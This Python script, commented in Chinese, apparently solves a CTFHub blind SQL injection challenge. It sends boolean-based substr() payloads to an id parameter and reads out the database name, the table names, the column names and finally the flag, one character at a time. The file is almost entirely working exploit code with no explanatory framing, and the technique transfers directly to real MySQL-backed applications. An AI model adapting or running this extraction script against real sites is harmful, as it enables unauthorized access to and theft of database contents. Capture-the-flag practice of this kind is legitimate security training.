import requests
import time

orginal_url ="http://challenge-6c9f33cad145efe4.sandbox.ctfhub.com:10800"

#attach = "/?id=1"

attach="/?id="
after_url = orginal_url+attach
print("当前注入的url: "+after_url)
result=""
result_lenth = 10 #
dictionary=r"qwertyuiopasdfghjklzxcvbnm123456789-=[]\;',./`~!@#$%^&*()_+{}|:<>?"+'"0'
dictionary_lenth = len(dictionary)
total = result_lenth*dictionary_lenth
times=0

def database_schema():
    List = []
    database_result = ""
    times = 0
    flag = 1
    for i in range(1, result_lenth + 1):
        if flag == 0:
            break
        for j in dictionary:
            payload = after_url +"if(substr(database(),{0},1) = '{1}',1,(select table_name from information_schema.tables))".format(i,j)
            r = requests.get(payload)
            response = str(r.text)
            #times += 1
            #print("当前进度{0}/{1}".format(times, total) + " payload:" + payload)
            if "query_success" in response:
                database_result += j
                print("测试库名：" + database_result)
                break
            elif j == "0":
                print("\n库名是：" + database_result)
                List.append(database_result)
                flag=0
    return List
def table_name():
    table_result = ""
    times = 0
    List=[]
    for k in range(1,4):
        flag=1
        table_result=""
        for i in range(1, result_lenth + 1):
            if flag == 0:
                break
            for j in dictionary:
                payload = after_url + 'if(substr((select table_name from information_schema.tables where table_schema=database() limit {0},1),{1},1)="{2}",1,(select table_name from information_schema.tables))'\
                .format(k,i,j)
                r = requests.get(payload)
                response = str(r.text)
                #times += 1
                #print("当前进度{0}/{1}".format(times, total) + " payload:" + payload)
                if "query_success" in response:
                    table_result +=j
                    print("测试表名：" + table_result)
                    break
                elif j == "0":
                    print("\n表名是：" + table_result)
                    List.append(table_result)
                    flag=0
    return List

def column_name():
    column_result = ''
    List=[]
    for k in range(0,3): #判断表里最多有4个字段
        flag=1
        column_result=''
        for i in range(1,9): #判断一个 字段名最多有9个字符组成
            if flag == 0:
                break
            for j in dictionary:
                payload=after_url+'if(substr((select column_name from information_schema.columns where table_name="flag"and table_schema= database() limit {0},1),{1},1)="{2}",1,(select table_name from information_schema.tables))'.format(k,i,j)
                r=requests.get(payload)
                response = str(r.text)
                if "query_success" in response:
                    column_result+=j
                    print("测试列名：" + column_result)
                    break
                elif j == "0":
                    print("\n列名是：" + column_result)
                    List.append(column_result)
                    flag=0
    return List
    #print ('column_name:',List)
def data_value():
    data_result = ""
    List=[]
    flag = 1
    for i in range(1,51):
        if flag==0:
            break
        for j in dictionary:
            payload = after_url+"if(substr((select flag from flag),{0},1)='{1}',1,(select table_name from information_schema.tables))".format(i,j)
            r=requests.get(payload)
            response=str(r.text)
            if "query_success" in response:
                data_result+=j
                print("测试数据内容："+data_result)
                break
            elif j =="0":
                print("\n数据为："+data_result)
                List.append(data_result)
                flag=0
data_value()